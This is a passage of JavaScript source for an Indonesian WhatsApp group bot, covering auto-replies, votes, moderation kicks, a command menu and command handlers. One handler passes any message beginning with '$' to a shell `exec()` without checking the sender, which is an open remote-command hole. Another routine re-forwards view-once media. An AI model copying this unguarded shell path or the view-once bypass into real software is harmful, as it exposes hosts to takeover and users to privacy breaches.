          `@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
          MessageType.text,
          {
            contextInfo: {
              mentionedJid: [`${owner}@s.whatsapp.net`],
              stanzaId: "B826873620DD5947E683E3ABE663F263",
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                imageMessage: {
                  caption: "*OFFLINE*",
                  jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                },
              },
            },
          }
        );
      }
    }
    if (mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (mek.message.extendedTextMessage != undefined) {
          if (mek.message.extendedTextMessage.contextInfo != undefined) {
            if (
              mek.message.extendedTextMessage.contextInfo.mentionedJid !=
              undefined
            ) {
              for (let ment of mek.message.extendedTextMessage.contextInfo
                .mentionedJid) {
                if (ment === `${owner}@s.whatsapp.net`) {
                  if (isAfk(mek.key.remoteJid)) return;
                  addafk(mek.key.remoteJid);
                  heheh = ms(Date.now() - waktu);
                  syaa.sendMessage(
                    mek.key.remoteJid,
                    `@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
                    MessageType.text,
                    {
                      contextInfo: {
                        mentionedJid: [`${owner}@s.whatsapp.net`],
                        stanzaId: "B826873620DD5947E683E3ABE663F263",
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                          imageMessage: {
                            caption: "*OFFLINE*",
                            jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                          },
                        },
                      },
                    }
                  );
                }
              }
            }
          }
        }
      }
    }

    //========================================================================================================================//
    colors = ["red", "white", "black", "blue", "yellow", "green"];
    const isMedia = type === "imageMessage" || type === "videoMessage";
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");
    if (!isGroup && prefix && command)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "args :",
        color(args.length)
      );
      
      	    // Auto Read
        syaa.chatRead(from, "read")
        //auto vn 
        await syaa.updatePresence(from, Presence.recording)
        
        const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍇 : 🍐',
        '🍊 : 🍋 : 🔔', //ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🍒 : 🍒 : 🍒 Win👑',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍌 : 🔔',
        '🔔 : 🔔 : 🔔 Win👑',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍇 : 🍇', 
        '🔔 : 🍐 : 🔔','🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍇 : 🍇 : 🍇 Win👑','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',	'🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐 Win👑','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🍒 : 🍒 : 🍒 Win👑','🍌 : 🍌 : 🍌 Win👑']
    //if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
    if (prefix && command && isGroup)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "in",
        color(groupName),
        "args :",
        color(args.length)
      );
    //if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
    if (isGroup && !isVote) {
      if (budy.toLowerCase() === "vote") {
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6283152753417@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "✅",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      } else if (budy.toLowerCase() === "devote") {
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6283152753417@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "❌",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      }
    }
    const sendKontak = (from, nomor, nama, org = "") => {
      const vcard =
        "BEGIN:VCARD\n" +
        "VERSION:3.0\n" +
        "FN:" +
        nama +
        "\n" +
        "ORG:" +
        org +
        "\n" +
        "TEL;type=CELL;type=VOICE;waid=" +
        nomor +
        ":+" +
        nomor +
        "\n" +
        "END:VCARD";
      syaa.sendMessage(
        from,
        { displayname: nama, vcard: vcard },
        MessageType.contact,
        { quoted: mek }
      );
    };
        ////CUT DIKIT
try {
    pporang = await syaa.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
} catch {
		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
    const ofrply = await getBuffer(pporang)
    ///AKHIR
 		   /*[-- no badword --]*/
 	   	if (isGroup && isBadWord) {
            if (bad.includes(messagesC)) {
                if (!isGroupAdmins) {
                    try { 
                        reply("JAGA UCAPAN DONG!! 😠")
                        } catch { syaa.sendMessage(from, text , {quoted : mek}) }
                } else {
                    return reply( "Tolong Jaga Ucapan Min 😇")
                }
            }
        }
      for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(commandsDB[i].balasan)
				}
				  }
    //kasih wm gw ajg kalau make
    if (isGroup && isAntilink && !mek.key.fromMe) {
      if (budy.includes("://chat.whatsapp.com/")) {
        if (isGroupAdmins) return reply(mess.admin);
        reply("ANTILINK DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        syaa.groupRemove(from, [sender]);
      }
    }
    ///STC AUTO RESPONDER :))///KASIH NAMA GUA DONG NGENTOD
if (budy.startsWith("@6288213292687")){
result = fs.readFileSync(`./strg/stiker/saya.webp`)
  syaa.sendMessage(from, result, sticker, { quoted: mek })
}
if (budy.includes("banh")){
result = fs.readFileSync(`./strg/stiker/banh.webp`)
  syaa.sendMessage(from, result, sticker, { quoted: mek })
}
if (budy.includes("anj")){
result = fs.readFileSync(`./strg/stiker/kasar.webp`)
  syaa.sendMessage(from, result, sticker, { quoted: mek })
}
if (budy.includes("Anj")){
result = fs.readFileSync(`./strg/stiker/kasar.webp`)
  syaa.sendMessage(from, result, sticker, { quoted: mek })
}
if (budy.includes("Ajg")){
result = fs.readFileSync(`./strg/stiker/kasar.webp`)
  syaa.sendMessage(from, result, sticker, { quoted: mek })
}
if (budy.includes("ajg")){
result = fs.readFileSync(`./strg/stiker/kasar.webp`)
  syaa.sendMessage(from, result, sticker, { quoted: mek })
}
/////AKHIR STC RESPON
///AUTO VN TEST
if (budy.startsWith("bot")) {
result = fs.readFileSync(`./strg/audio/bot.mp3`)
  syaa.sendMessage(from, result, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
}
if (budy.startsWith("Bot")) {
result = fs.readFileSync(`./strg/audio/bot.mp3`)
  syaa.sendMessage(from, result, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
}
if (budy.startsWith("lah")) {
result = fs.readFileSync(`./strg/audio/eh.mp3`)
  syaa.sendMessage(from, result, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
}
if (budy.startsWith("Lah")) {
result = fs.readFileSync(`./strg/audio/eh.mp3`)
  syaa.sendMessage(from, result, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
}
if (budy.startsWith("Bener")) {
result = fs.readFileSync(`./strg/audio/pembohong.mp3`)
  syaa.sendMessage(from, result, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
}
if (budy.startsWith("bener")) {
result = fs.readFileSync(`./strg/audio/pembohong.mp3`)
  syaa.sendMessage(from, result, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
}
if (budy.startsWith("boong")) {
result = fs.readFileSync(`./strg/audio/pembohong.mp3`)
  syaa.sendMessage(from, result, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
}
/////AUTO RESPONDER NYA YG TEKS
//////////AKHER
    if (isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {
      reply(
        `@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`
      );
      var msg = { ...mek };
      msg.mek = mek.message.viewOnceMessage.message;
      msg.mek[Object.keys(msg.mek)[0]].viewOnce = false;
      syaa.copyNForward(m.chat, msg);
    }
    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
      );
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
      kick(from, sender);
    }
    if (isGroup && isAntivirtex && !mek.key.fromMe) {
      if (budy.length > 700) {
        if (isGroupAdmins) return reply(mess.admin);
        reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        syaa.groupRemove(from, sender);
      }
    }
    if (isGroup && autojoin == true) {
      if (budy.includes("://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        syaa.query({
          json: [
            "action",
            "invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }
    if (isGroup && isKickarea && !mek.key.fromMe) {
      if (sender.includes("62")) {
        reply("GRUP ONLY +62!");
        syaa.groupRemove(from, [sender]);
      }
    }
    if (_chats.startsWith(">")) {
      if (!isOwner && !mek.key.fromMe) return sticOwner(from)
      try {
        return syaa.sendMessage(
          from,
          JSON.stringify(eval(budy.slice(2)), null, "\t"),
          text,
          { quoted: mek }
        );
      } catch (err) {
        e = String(err);
        reply(e);
      }
    }
    if (budy.startsWith('$')){
      const cod = args.join(' ')
      exec(cod, (err, stdout) => {
      if(err) return reply(`${err}`)
      if (stdout) {
      reply(`${stdout}`)
      }
      })
    }
    if (budy.startsWith('>')){
      if (!mek.key.fromMe) return
      try {
      return syaa.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
      } catch(err) {
      e = String(err)
      reply(e)
      }
      }
      if (budy.startsWith('=>')){
      if (!isOwner && !mek.key.fromMe) return sticOwner(from)
      var konsol = budy.slice(3)
      var util = require("util")
      Return = (sul) => {
      var sat = JSON.stringify(sul, null, 2)
      bang = util.format(sat)
      if (sat == undefined){
      bang = util.format(sul)
      }
      return reply(bang)
      }
      try {
      reply(util.format(eval(`;(async () => { ${konsol} })()`)))
      console.log('\x1b[1;37m>', '[', '\x1b[1;32mEVAL\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      } catch(e){
      reply(String(e))
      }
      }
if (!mek.key.fromMe && banChats === true) return;
    switch (command) {
      case "infomenu":
        case "allmenu":
          case "menuall":
            if (isBanned) return reply(mess.ban)
            jijay = `${sender}`
            reply(`Jangan Lupa Follow Instagram @${instagram}`)
        var menu = `${ucapanWaktu} kak *${pushname}*
        
❋─────────────────❋
*⦿ Nama :* ${pushname}
*⦿ Tag :* @${jijay.split('@')[0]}
*⦿ Status :* ${premi}
*⦿ Registrasi :* ${regis}
*⦿ Jam :* ${jam}
*⦿ Hari :* ${week} ${weton}
*⦿ Tanggal :* ${date}
${readmore}❋─────────────────❋

_ada Bug?_ ketik ${prefix}report _Alasan_

*OWNER*
• ${prefix}addbadword _KataToxic_
• ${prefix}delbadword _ListToxic_
• ${prefix}addbucin _Kata_
• ${prefix}addrespon _Pesan|Balas_
• ${prefix}delrespon _Pesan_
• ${prefix}off
• ${prefix}on
• ${prefix}status
• ${prefix}setthumb
• ${prefix}settarget
• ${prefix}shutdown
• ${prefix}hacked
• ${prefix}setfakeimg
• ${prefix}addprem @user
• ${prefix}dellprem @user
• ${prefix}ban @user
• ${prefix}unban @user
• ${prefix}setreply
• ${prefix}setprefix [2 Button]
• ${prefix}mode [2 Button self/public]
• ${prefix}term <code>
• ${prefix}eval <code>
• ${prefix}colongsw 
• ${prefix}readall
 $
 >
 =>
    
*GRUP*
• ${prefix}nobadword enable/disable
• ${prefix}grup [3 Button]
• ${prefix}getpic @user
• ${prefix}promote <reply chat member>
• ${prefix}demote <reply chat member>
• ${prefix}setdesc
• ${prefix}setname
• ${prefix}kick <reply/tag member>
• ${prefix}add <reply/tag member>
• ${prefix}getbio <reply chat member>
• ${prefix}getname <reply chat member>
• ${prefix}reminder <msg/2s>
• ${prefix}listonline
• ${prefix}groupinfo
• ${prefix}leavetime
• ${prefix}tutuptime

• ${prefix}bukatime
• ${prefix}linkgc
• ${prefix}sider [reply chat bot]
• ${prefix}antilink
• ${prefix}antihidetag
• ${prefix}antiviewonce
• ${prefix}antivirtex
• ${prefix}kickarea
    
*MAKER*
• ${prefix}fdeface
• ${prefix}semoji
• ${prefix}wasted
• ${prefix}wanted
• ${prefix}pubglogo teks|teks
• ${prefix}deltrash
• ${prefix}squidrip
• ${prefix}sertiff1 <text>
• ${prefix}bpink <text>
• ${prefix}tulis _Text_
• ${prefix}nuliskanan _Text_
• ${prefix}nuliskiri _Text_
• ${prefix}foliokanan _Text_
• ${prefix}foliokiri _Text_
• ${prefix}googlem Text|Text
• ${prefix}roses
• ${prefix}wooden
• ${prefix}quote
• ${prefix}textburn
• ${prefix}card-game Judul|Keterangan
• ${prefix}tahta _Nama_
• ${prefix}halloween _Name_
• ${prefix}minion _Name_
• ${prefix}dance _Name_
• ${prefix}warrior _Name_
• ${prefix}text3d _Name_
• ${prefix}express
• ${prefix}spiderman
• ${prefix}matrix
• ${prefix}vampire
• ${prefix}remm _Name_
• ${prefix}lolim _Text_
• ${prefix}kaneki _Name_
• ${prefix}text2d _Text_
• ${prefix}logogaming _Text_
    
*MAKER CONVERT*
• ${prefix}spongebobm _ReplyGambar_
• ${prefix}hengkerm _ReplyGambar_
• ${prefix}hengkerm2 _ReplyGambar_
• ${prefix}ripm _ReplyGambar_
• ${prefix}stonkm _ReplyGambar_
• ${prefix}notstonkm _ReplyGambar_
• ${prefix}patrickm _ReplyGambar_

*NSFW MENU*
• ${prefix}hentai
• ${prefix}blowjob
• ${prefix}trap
   
*GAME MENU*
• ${prefix}afk _Alasan_
• ${prefix}slot
• ${prefix}tictactoe @user
• ${prefix}delttt
• ${prefix}suit
   
*FUN MENU*
• ${prefix}bucin
• ${prefix}say _Text_
• ${prefix}bisakah _Querry_
• ${prefix}kapankah _Querry_
• ${prefix}apakah _Querry_
• ${prefix}belah _Querry_
• ${prefix}bagaimanakah _Querry_
• ${prefix}rate _Querry_
• ${prefix}caklontong
• ${prefix}sangecek _Name_
• ${prefix}gaycek _Name_
• ${prefix}terganteng
• ${prefix}tercantik
• ${prefix}lesbicek _Name_
• ${prefix}gantengcek _Name_
• ${prefix}cantikcek _Name_
• ${prefix}watak _Name_
• ${prefix}hobby _Name_
• ${prefix}jadian
• ${prefix}ngewe
• ${prefix}tod
• ${prefix}truth
• ${prefix}dare
• ${prefix}wangy _NamaMu_
• ${prefix}citacita

*STICKER MENU*
• ${prefix}stcmeme Atas|bawah
• ${prefix}bajingan lu _Text_
• ${prefix}sticker
• ${prefix}gay
• ${prefix}take Author|Pack
• ${prefix}swm Author|Pack
• ${prefix}attp _Text_
• ${prefix}ttp _Text_
• ${prefix}ttpblue _Text_
• ${prefix}ttpyellow _Text_
• ${prefix}ttpgreen _Text_
   
*CONVERT*
• ${prefix}toimg
• ${prefix}tomp3
• ${prefix}tomp4
• ${prefix}slow
• ${prefix}fast
• ${prefix}reverse
• ${prefix}tourl
    
*DOWNLOADER*
• ${prefix}youtube <url>
• ${prefix}ytmp3 <url>
• ${prefix}ytmp4 <url>
• ${prefix}tiktok <url>
• ${prefix}instagram <url>
• ${prefix}twitter <url>

*UP STORY*
• ${prefix}upswteks
• ${prefix}upswimage
• ${prefix}upswvideo
• ${prefix}upswvoice
• ${prefix}upswgif
• ${prefix}upswaudio
• ${prefix}upswsticker

*STORAGE MENU*
• ${prefix}addvn _Nama_
• ${prefix}addvideo _Nama_
• ${prefix}addsticker _Nama_
• ${prefix}addimage _Nama_
• ${prefix}listvn
• ${prefix}listvideo
• ${prefix}liststicker
• ${prefix}listimg
• ${prefix}getvn _Database_
• ${prefix}getvideo _Database_
• ${prefix}getsticker _Database_
• ${prefix}getimage _Database_
    
*FUN*
• ${prefix}fitnah
• ${prefix}fitnahpc
• ${prefix}kontak
    
*TAG*
• ${prefix}hidetag
• ${prefix}kontag
• ${prefix}sticktag
• ${prefix}totag
    
*OTHER*
• ${prefix}ssweb _Link_
• ${prefix}sswebfull _Link_
• ${prefix}tovn
• ${prefix}shortlink _Link_
• ${prefix}wikipedia _Querry_
• ${prefix}asupan
• ${prefix}ocr
• ${prefix}asupan2
• ${prefix}tts id _Text_
• ${prefix}polosanmeme
• ${prefix}virtex
• ${prefix}memeindo
• ${prefix}detikvn <ReplyVn|Jumlah>
• ${prefix}detikvideo <ReplyVid|Jumlah>
• ${prefix}delete
• ${prefix}infogempa
• ${prefix}dadu
• ${prefix}tospam _Jumlah_
• ${prefix}ping
• ${prefix}inspect
• ${prefix}join
• ${prefix}caripesan <query>
• ${prefix}get
• ${prefix}ytsearch <query>
• ${prefix}igstalk <query>
• ${prefix}githubstalk <query>
• ${prefix}tiktokstalk <query>
• ${prefix}play <query>
• ${prefix}video <query>
• ${prefix}igstory <username>
• ${prefix}twitter <link>
• ${prefix}tiktok <link>
• ${prefix}tiktokaudio <link>
• ${prefix}fb <link>
• ${prefix}brainly <query>
• ${prefix}image <query>
• ${prefix}anime <random>
• ${prefix}pinterest <query>
• ${prefix}komiku <query>
• ${prefix}lirik <query>
• ${prefix}chara <query>
• ${prefix}playstore <query>
• ${prefix}otaku <query>
    
*RANDOM IMAGE*
• ${prefix}neko
• ${prefix}darkjokes
• ${prefix}cecan
• ${prefix}cogan
• ${prefix}quotes
• ${prefix}kucing
• ${prefix}squidward
• ${prefix}spongebob
• ${prefix}patrick
• ${prefix}minato
• ${prefix}kakashi
• ${prefix}boruto
• ${prefix}sarada
• ${prefix}mitsuki
• ${prefix}sasuke
• ${prefix}sakura
• ${prefix}itachi
• ${prefix}megumin
• ${prefix}loli
• ${prefix}husbu
• ${prefix}wafiu
• ${prefix}wallpaperanime
• ${prefix}naruto
• ${prefix}aesthetic

*JADI BOT*
• ${prefix}jadibot
• ${prefix}stopjadibot
• ${prefix}listbot

*STICKER CMD*
• ${prefix}addcmd
• ${prefix}delcmd
• ${prefix}listcmd
    
*VOTE*
• ${prefix}voting
• ${prefix}delvote
 vote
 devote

*_THANKS BUAT_*
===================
- _AFFIS JUNIANTO_
- _RAFLI RUSDIANA_
- _YOGI PW_
- _KurrXd_
- _YANNNZ_
- _MEGUMIN_
- _MANIK_
- _WISNU_
- _MHANK BAR BAR_
- _BAILEYS_
- _ARASYA_

 *INFO BOT*
• Prefix : 「 ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」
• Runtime : ${runtime(process.uptime())}
• Hit Today : ${hit_today.length} Hit
• Total Hit : ${totalhit} Hit
• Total Chat : ${totalchat.length} Chat

`;
        sendButImage(from, menu, "by @sofunsyabi.id ❤️", thumb, [
          {
            buttonId: `${prefix}donasi`,
            buttonText: {
              displayText: `Donasi💰`,
            },
            type: 1,
          },
                    {
            buttonId: `${prefix}sewa`,
            buttonText: {
              displayText: `SEWA BOT`,
            },
            type: 1,
          },
        ], {contextInfo: { mentionedJid: [jijay]}});

        break;
        case 'leave':
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
          if (isBanned) return reply(mess.ban)
             if (!isGroup) return reply("Khusus di grup");
					if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.admin);
                setTimeout( () => {
                syaa.groupLeave (from) 
                }, 2000)
                setTimeout( () => {
                syaa.updatePresence(from, Presence.composing) 
                syaa.sendMessage(from, 'Bye cuk🗣', text) // ur cods
                }, 0)
                break
////daptar
case 'verify':
if (isRegistered) return sticOk(from)
const serialUser = createSerial(18)
	        veri = sender
	        _registered.push(sender)
	        fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
	        addRegisteredUser(sender, serialUser)
	         const jancok = `╭─❒ 「 Verify 」 ❒
Okeee Terima Kasih telah daftar di JojoBot
Silahkan Akses dengan cara ketik /menu

📛 Nama : ${pushname}
⚠️ Nomer : ${sender.split('@')[0]}
♨️ Seri : ${serialUser}
👥 Pengguna : ${_registered.length}

Silahkan Join Grup JojoBot Ketik /grupjojo`
gbutsan = [
{buttonId:`/menu`,buttonText:{displayText:'MENU'},type:1},
{buttonId:`/owner`,buttonText:{displayText:'OWNER'},type:1}
]
mhan = await syaa.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const sendBtnVeryy = {
imageMessage: mhan.message.imageMessage,
contentText:`${jancok}`,
footerText:'Bagi Kalian Pengguna Wa Mod, Silahkan Ketik #verify Untuk Mendaftar Ke Database Bot\nBy @sofunsyabi.id', 
buttons: gbutsan,
headerType: 4
}
syaa.sendMessage(from, sendBtnVeryy, MessageType.buttonsMessage, {quoted:mek, contextInfo: { mentionedJid: [sender]}})
	         console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
	    // console.log(e)
        break
        case 'tagall':
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
          if (isBanned) return reply(mess.ban)
              if (!isGroup) return reply("Khusus di grup");
					if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.admin);
              let arr = [];
              let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
              for (let i of groupMembers){
              txti += `=> @${i.jid.split("@")[0]}\n`
              arr.push(i.jid)
}
              mentions(txti, arr, true)
              break
				    case "sc":
				      case "script":
				        case "sourcecode":
				          case "scnya":
				            case "scbot":
				      reply("Bot Ini Menggunakan Script https://github.com/GetSya/JojoRepo\nDan Subscribe Channenya https://youtube.com/channel/UCZzt-Qw0zTYc8UP-LL2G5fA")
				      break
        case "menu":
          case "m":
          case "help":
            if (isBanned) return reply(mess.ban)
            reply("Wait!")
            stod = `${sender}`
        var menu = `Halloo ${pushname} Aku ${namabot}

❋─────────────────❋
 *INFO OWNER*
 📧 Instagram : _@${instagram}_
 🪀 Whatsapp : @${dtod.split('@')[0]}
 📌 Github : https://github.com/GetSya
 
*${prefix}sticker*
*${prefix}sticker2*
*${prefix}owner*
*${prefix}info*

❋─────────────────❋
${c}• ${prefix}ownermenu${c}
${c}• ${prefix}grupmenu${c}
${c}• ${prefix}makermenu${c}
${c}• ${prefix}funmenu${c}
${c}• ${prefix}convertmenu${c}
${c}• ${prefix}downloadmenu${c}
${c}• ${prefix}uploadmenu${c}
${c}• ${prefix}storagemenu${c}
${c}• ${prefix}menulain${c}
${c}• ${prefix}stcmd${c}
${c}• ${prefix}votemenu${c}
${c}• ${prefix}imagemenu${c}
${c}• ${prefix}makerc${c}
${c}• ${prefix}nsfwmenu${c}
${c}• ${prefix}stcmenu${c}
${c}• ${prefix}gamemenu${c}
 
 Join Grup ${namabot}!
 
 ${grupct}

❋─────────────────❋
 *INFO BOT JOJO*
• Prefix : 「 ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」
• Runtime : ${runtime(process.uptime())}
• Hit Today : ${hit_today.length} Hit
• Total Hit : ${totalhit} Hit
• Total Chat : ${totalchat.length} Chat
❋─────────────────❋
`;
        sendButImage(from, `${menu}`, "*© Jojo - BOT X Arasya*", thumb, [
          {
            buttonId: `${prefix}allmenu`,
            buttonText: {
              displayText: `⋮☰ Semua Menu`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}owner`,
            buttonText: {
              displayText: `⋮☰ Pemilik Bot`,
            },
            type: 1,
          },
        {
            buttonId: `${prefix}peraturan2`,
            buttonText: {
              displayText: `S&K`,
            },
            type: 1,
          },
        ], {quoted:fgclink, contextInfo: { mentionedJid: [stod, dtod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`Hai ${pushname}`,body:`Subscribe My Channel, Click Here Please`,mediaType:"2",thumbnail:ofrply,mediaUrl:`https://youtube.com/channel/UCZzt-Qw0zTYc8UP-LL2G5fA`}}})//YANG NGAPUS NGENTOT BABI BAJINGAN BANGSAD MEMEK, MAKANYA KASIH TQ TO NAMA GW, GUA MAU PENSI NIH, JADI LU HARGAI GUA BANGSAD
        break;
        
      case "owner":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        sendKontak(from, owner, `${nama_owner}`, `Pemilik ${namabot}`);
        sendButMessage(
          from,
          `Mau tanya² tentang apa?`,
          `Silahkan pilih salah satu`,
          [
            {
              buttonId: `${prefix}ytjojo`,
              buttonText: {
                displayText: `YOUTUBE▶️`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}igstalk sofunsyabi.id`,
              buttonText: {
                displayText: `INSTAGRAM📧`,
              },
              type: 1,
            },
          ]
        );
        break;
        case "ytbro":
          reply("https://youtube.com/channel/UCZzt-Qw0zTYc8UP-LL2G5fA\nJangan lupa Subscribe")
        break;
        case "grupjojo":
          reply("https://chat.whatsapp.com/HECLovHbCI6LVVH4Q8FN2C")
          break;
        case "peraturan":
        reply("By @sofunsyabi.id\n\nPergunakan Bot Dengan Baik Dan Bijak!!!\n- Jangan Spam Dan Jangan Telepon Bot!!!\n- Silahkan Hubungi Owner Jika Bot Mengalama Kendala!!\n- Jangan Paksakan Bot Masuk Ke Grup Kamu!!!\n- <> TIDAK DI ANGGAP!!\n\nOkee Thanks🗿");
        break;
  
        
      //------------------< Sticker Cmd >-------------------
      case "addcmd":
      case "setcmd":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (isBanned) return reply(mess.ban)
        if (isQuotedSticker) {
          if (!q)
            return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`);
          var kodenya =
            mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
              "base64"
            );
          addCmd(kodenya, q);
          reply("Done!");
        } else {
          reply("tag stickenya");
        }
        break;
      case "delcmd":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (isBanned) return reply(mess.ban)
        if (!isQuotedSticker)
          return reply(`Penggunaan : ${command} tagsticker`);
        var kodenya =
          mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
            "base64"
          );
        _scommand.splice(getCommandPosition(kodenya), 1);
        fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
        reply("Done!");
        break;
      case "listcmd":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``;
        cemde = [];
        for (let i of _scommand) {
          cemde.push(i.id);
